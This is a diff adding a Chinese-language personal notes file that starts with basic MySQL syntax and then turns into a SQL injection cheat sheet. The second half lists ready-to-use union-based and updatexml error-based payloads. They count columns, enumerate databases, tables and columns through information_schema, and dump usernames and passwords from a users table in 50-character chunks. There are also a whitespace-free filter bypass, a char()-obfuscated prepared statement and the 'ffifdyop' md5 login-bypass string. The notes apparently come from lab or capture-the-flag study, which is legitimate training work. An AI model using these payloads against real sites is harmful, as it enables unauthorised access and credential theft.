@@ -1,0 +1,385 @@
+
+创建数据库
+CREATE DATABASE 数据库名;
+
+删除数据库
+drop database 数据库名;
+
+选择数据库
+USE 数据库名
+
+创建   表格 如果 不 存在
+CREATE TABLE IF NOT EXISTS '表格名字'(
+    '字段名1' 类型 无符号 自动递增,
+    'id' INT UNSIGNED AUTO_INCREMENT,
+    '字段名2' 类型(长度) 不是null,
+    'user' VARCHAR(100) NOT NULL,
+    关键字用于定义列为主键。 您可以使用多列来定义主键，列间以逗号分隔
+    PRIMARY KEY ('id')
+)ENGINE=InnoDB DEFAULT CHARSET=utf8;
+ENGINE 设置存储引擎，CHARSET 设置编码。
+
+create table table_name(字段名 数据类型 可选的约束条件)
+
+修改表–添加字段
+alter table 表名 add 列名 类型
+demo：alter table students add birthday datetime;
+
+删除数据表
+DROP TABLE 表格名称;
+
+添加到'users'表(字段名1,字段名2,字段名3,字段名4)值(自增,"8","8",7)
+INSERT INTO users(id,username,password,level)VALUES(null,"8","8",7);
+
+查询 字段名1,字段名2(*表示全部字段) 从 数据表1,数据表2
+查询 全部字段 从'users'表输出
+select * from users;
+
+查询 * 从'users'表匹配的username的输出
+SELECT * from users WHERE username='???';
+
+修改'users'表中'username'字段的'???'条件是id=3
+UPDATE users SET username='???' WHERE id=3;
+
+删除'users'表中条件是id=3
+DELETE FROM users WHERE id=3;
+
+删除表中的所有数据:
+delete from 表格名称;
+
+// LIKE 子句中使用百分号 %字符来表示任意字符，类似于UNIX或正则表达式中的星号 *
+//LIKE 子句与等号 = 的效果是一样的。
+'%a'     //以a结尾的数据
+'a%'     //以a开头的数据
+'%a%'    //含有a的数据
+'_a_'    //三位且中间字母是a的
+'_a'     //两位且结尾字母是a的
+'a_'     //两位且开头字母是a的
+查询'users'表中'username'字段的%k
+SELECT * from users  WHERE username LIKE '%k';
+SELECT * from users  WHERE username='123';
+
+
+表格排序-升序
+SELECT * from 表格名称 ORDER BY 字段名 ASC;
+表格排序-降序
+SELECT * from 表格名称 ORDER BY 字段名 DESC;
+
+合并统计出现次数
+SELECT 输出字段列, COUNT(*) FROM 表格名称 GROUP BY 统计的字段列表;
+合并name，统计singin出现次数
+SELECT name, SUM(singin) as singin_count FROM  employee_tbl GROUP BY name WITH ROLLUP;
+
+
+
+数据库操作
+当前数据库：select database()
+当前数据库：database()
+所有数据库：show DATABASES
+所有数据库：select group_concat(schema_name) from information_schema.schemata
+创建数据库：create databases 数据库名 charset=utf8
+创建数据库：create databases 数据库名
+删除数据库：drop 数据库名
+使用数据库：use 数据库名
+SHOW CREATE DATABASE 想判断的数据库名;
+
+
+表的操作
+查看表结构：desc xk
+删除表：drop table 表名
+数据表名
+show tables
+SHOW tables FROM db_name
+
+数据库.数据表
+updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e,(select schema_name),0x7e) FROM admin limit 0,1),0x7e),1)
+
+数据表属性
+SHOW TABLE STATUS WHERE Name='xk'
+
+数据表名
+数据库名字：table_schema
+数据库表名：table_name
+select table_schema,table_name from information_schema.tables WHERE table_schema='数据库名'
+select group_concat(table_name) from information_schema.tables where table_schema='数据库名'
+
+字段名
+desc xk
+show columns from xk
+select group_concat(column_name) from information_schema.columns where table_name='数据表名'
+select group_concat(column_name) from information_schema.columns where table_name='数据表名'
+select group_concat(column_name) from information_schema.columns where table_name='数据表名' and TABLE_SCHEMA='数据库'
+
+数据
+SET @sql_xk_0=concat(char(115,101,108,101,99,116),'* from users');PREPARE st from @sql_xk_0;EXECUTE st;#
+
+SET @sql_xk_0=concat('select * from users');
+PREPARE st from @sql_xk_0;
+EXECUTE st;
+
+
+
+权限
+SELECT user()
+
+版本
+SELECT VERSION()
+
+查询后面，看查询表的字段数
+ order by 2
+ order by 1,2,3,4,5,6,7,8,9#
+
+联合查询
+SELECT * from users WHERE username='1' union select 1,2,3
+union select 1,2,3
+
+数字字段
+`1919810931114514`
+
+
+报错注入
+~	\u007e	0x7e
+{	\u007b	0x7b
+}	\u007d	0x7d
+and updatexml(1,concat('~',(    ),'~'),1);
+and updatexml(1,concat(0x7e,(    ),0x7e),1);
+and updatexml(1,concat(0x7b,(    ),0x7d),1);
+
+
+取中
+substr(文本，起始位置，输出位数)
+substring()
+mid()
+
+倒取文本
+right(文本,取文本数)
+
+正取文本
+left(文本,取文本数)
+
+合并
+group_concat()
+concat()
+
+取行数
+count(*)
+
+显示MySQL当前支持哪些存储引擎和默认存储引擎
+SHOW ENGINES;
+
+
+显示MySQL当前支持哪些字符集
+SHOW CHARACTER SET;
+SHOW CHARACTER SET LIKE '%utf%';
+
+
+显示MySQL支持字符集的排序规则
+SHOW COLLATION;
+
+
+
+删除字段alter table 表名 drop 列名
+
+
+
+增加
+insert into 表名 values(0,’郭靖‘,1,'蒙古','2016-1-2');
+
+
+修改
+update 表名 set 列1=值1,列2=值2... where 条件
+例：
+update students set gender=0,hometown='北京' where id=5;
+
+
+删除
+delete from 表名 where 条件
+例：
+delete from students where id=5;
+
+
+转为ascii
+ascii()
+
+
+取长度
+length()
+
+md5
+ffifdyop
+
+判断
+((group_concat((1=1),(1=1)))like(11))
+
+
+
+^
+
+
+
+
+联合注入
+权限：SELECT user()
+版本：SELECT VERSION()
+当前数据库：select database()
+所有数据库：show DATABASES
+所有数据库：select group_concat(schema_name) from information_schema.schemata
+表名：select group_concat(table_name) from information_schema.tables where table_schema='数据库名'
+字段：select group_concat(column_name) from information_schema.columns where table_name='数据表名' and TABLE_SCHEMA='数据库'
+
+ order by 1,2,3#
+ order by 1,2,3,4,5,6,7,8,9#
+ 
+ union select 1,2,3#
+ union select 1,2,3,4,5,6,7,8,9#
+ 
+ union select 1,database(),3#
+ union select 1,database(),group_concat(schema_name) from information_schema.schemata#
+ 
+ union select 1,user(),group_concat(table_name) from information_schema.tables where table_schema=database()#
+ union select 1,user(),group_concat(table_name) from information_schema.tables where table_schema='123456'#
+ 
+ union select 1,version(),group_concat(column_name) from information_schema.columns where table_name='users'#
+ union select 1,version(),group_concat(column_name) from information_schema.columns where table_name='users' and TABLE_SCHEMA=database()#
+
+ union select 1,2,group_concat('[',id,',',username,',',password,']') from users#
+
+
+
+
+
+
+
+报错注入
+权限：SELECT user()
+版本：SELECT VERSION()
+当前数据库：select database()
+所有数据库：show DATABASES
+所有数据库：select group_concat(schema_name) from information_schema.schemata
+表名：select group_concat(table_name) from information_schema.tables where table_schema='数据库名'
+字段：select group_concat(column_name) from information_schema.columns where table_name='数据表名' and TABLE_SCHEMA='数据库'
+取中：substr(文本，起始位置，输出位数)
+~	\u007e	0x7e
+{	\u007b	0x7b
+}	\u007d	0x7d
+and updatexml(1,concat('~',(    ),'~'),1);
+and updatexml(1,concat(0x7e,(    ),0x7e),1);
+and updatexml(1,concat(0x7b,(    ),0x7d),1);
+and updatexml(1,concat('{',substr((),1,50),'}'),1);#
+
+数据库
+ and updatexml(1,concat('{',(database()),'}'),1);#
+
+全部数据库
+ and updatexml(1,concat('{',substr((select group_concat(schema_name) from information_schema.schemata),1,50),'}'),1);#
+ and updatexml(1,concat('{',substr((select group_concat(schema_name) from information_schema.schemata),25,50),'}'),1);#
+ and updatexml(1,concat('{',substr((select group_concat(schema_name) from information_schema.schemata),50,50),'}'),1);#
+ and updatexml(1,concat('{',substr((select group_concat(schema_name) from information_schema.schemata),75,50),'}'),1);#
+ and updatexml(1,concat('{',substr((select group_concat(schema_name) from information_schema.schemata),100,50),'}'),1);#
+
+数据表
+ and updatexml(1,concat('{',substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,50),'}'),1);#
+
+字段
+ and updatexml(1,concat('{',substr((select group_concat(column_name) from information_schema.columns where table_name='users' and TABLE_SCHEMA='security'),1,50),'}'),1);#
+
+数据
+ and updatexml(1,concat('{',substr((select group_concat('[',id,',',username,',',password,']') from users),1,50),'}'),1);#
+ and updatexml(1,concat('{',substr((select group_concat('[',id,',',username,',',password,']') from users),25,50),'}'),1);#
+ and updatexml(1,concat('{',substr((select group_concat('[',id,',',username,',',password,']') from users),50,50),'}'),1);#
+ and updatexml(1,concat('{',substr((select group_concat('[',id,',',username,',',password,']') from users),75,50),'}'),1);#
+ and updatexml(1,concat('{',substr((select group_concat('[',id,',',username,',',password,']') from users),100,50),'}'),1);#
+ and updatexml(1,concat('{',substr((select group_concat('[',id,',',username,',',password,']') from users),125,50),'}'),1);#
+ and updatexml(1,concat('{',substr((select group_concat('[',id,',',username,',',password,']') from users),150,50),'}'),1);#
+ and updatexml(1,concat('{',substr((select group_concat('[',id,',',username,',',password,']') from users),175,50),'}'),1);#
+
+发梦冲
+ and updatexml(1,concat('{',(database()),'|',(select group_concat(schema_name) from information_schema.schemata),'}'),1);#
+
+去除空格
+ and(updatexml(1,concat('{',(database()),',',((select(group_concat(schema_name))from(information_schema.schemata))),'}'),1))#
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
